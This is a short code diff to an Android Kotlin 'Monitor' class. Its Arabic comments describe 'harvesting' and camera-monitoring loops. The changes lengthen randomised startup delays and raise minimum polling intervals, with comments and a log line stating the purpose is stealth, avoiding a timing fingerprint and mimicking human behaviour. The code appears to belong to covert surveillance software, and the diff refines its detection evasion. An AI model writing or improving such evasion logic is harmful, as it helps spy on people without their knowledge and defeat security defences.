@@ -31,6 +31,8 @@ import kotlin.random.Random
  * ✅ تم إضافة جيتر منفصل لفترات الحصاد والكاميرا.
  * ✅ تم إضافة حد أقصى للجيتر لمنع التأخيرات الطويلة غير الطبيعية.
  * ✅ تم تطبيق تأخيرات عشوائية في جميع حلقات المراقبة لمحاكاة السلوك البشري.
+ * ✅ تم توسيع نطاق تأخير بدء التشغيل إلى 15-60 ثانية.
+ * ✅ تم زيادة الحد الأدنى للفاصل الزمني إلى 120 ثانية.
  */
 class Monitor private constructor(context: Context) {
 
@@ -450,8 +452,8 @@ class Monitor private constructor(context: Context) {
         isRunning = true
 
         scope.launch {
-            // ✅ تأخير عشوائي عند بدء التشغيل (10-45 ثانية) لتجنب البصمة الزمنية
-            val startupDelay = Random.nextLong(10_000, 45_000)
+            // ✅ تأخير عشوائي عند بدء التشغيل (15-60 ثانية) لتجنب البصمة الزمنية
+            val startupDelay = Random.nextLong(15_000, 60_000)
             writeLog("⏳ Delaying startup by ${startupDelay / 1000}s for stealth...")
             delay(startupDelay)
 
@@ -508,8 +510,8 @@ class Monitor private constructor(context: Context) {
                 val jitterFactor = 1.0 + Random.nextDouble(-jitterPercent, jitterPercent)
                 var jitteredInterval = (baseInterval * jitterFactor).toLong()
 
-                // الحد الأدنى للفاصل الزمني (لا يقل عن 60 ثانية)
-                jitteredInterval = maxOf(60L, jitteredInterval)
+                // ✅ الحد الأدنى للفاصل الزمني (لا يقل عن 120 ثانية)
+                jitteredInterval = maxOf(120L, jitteredInterval)
 
                 // الحد الأقصى للجيتر (لا يزيد عن baseInterval + maxJitterLimit)
                 jitteredInterval = minOf(baseInterval + maxJitterLimit, jitteredInterval)
